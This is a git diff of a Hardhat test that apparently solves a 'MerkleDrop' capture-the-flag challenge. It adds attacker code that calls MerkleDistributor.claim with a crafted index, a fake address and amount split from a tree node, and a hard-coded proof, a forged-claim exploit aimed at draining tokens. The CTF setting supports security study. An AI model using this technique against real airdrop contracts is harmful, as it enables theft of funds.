66b3154c2c31c042de43ed6508d02957b4b9fef0
0xSilas <silaszhr@gmail.com>
2022-09-18 23:52:15 +0800

    fix: exp issues

--- test/merkledrop/merkledrop.ts
+++ test/merkledrop/merkledrop.ts
@@ -2,6 +2,8 @@ import {ethers} from 'hardhat';
 import {expect} from 'chai';
 import {findNode, getResult } from './helper';
 import { BigNumber } from 'ethers';
+import {merkleRoot, tokenTotal, claims} from  '../../contracts/merkledrop/tree.json';
+
 
 describe('[Challenge] MerkleDrop', function () {
 
@@ -24,10 +26,29 @@ describe('[Challenge] MerkleDrop', function () {
         let node = await findNode();
         let results = getResult();
         results = results.map(x => x.toString())
-        const RandomFactory = await ethers.getContractFactory('Random', attacker);
-        const RandomAddress = (await this.challenge.random());
-        const Random = RandomFactory.attach(RandomAddress);
-        await Random.solve(4);
+        
+        const merkleDisbutorAddress = await this.challenge.merkleDistributor();
+        const MerkleDistributorFactory = await ethers.getContractFactory('MerkleDistributor', attacker);
+        const MerkleDistributor = MerkleDistributorFactory.attach(merkleDisbutorAddress);
+
+        for (let p in results){
+            for (let leaf in claims) {
+                let leafData = claims[leaf];
+                if (node['amounts'] === results[p]){
+                    await MerkleDistributor.claim(leafData['index'], leaf, leafData['amount'], leafData['proof']);
+                }
+            }
+        }
+        
+        console.log(node[0]);
+        console.log(node[0].substr(0,42), node[0].substr(42));
+        await MerkleDistributor.claim("0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442", node[0].substr(0,42), '0x'+ node[0].substr(42),  [
+            "0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d",
+            "0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde",
+            "0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813",
+            "0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c",
+            "0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5"
+        ]);
     });
 
     after(async function () {
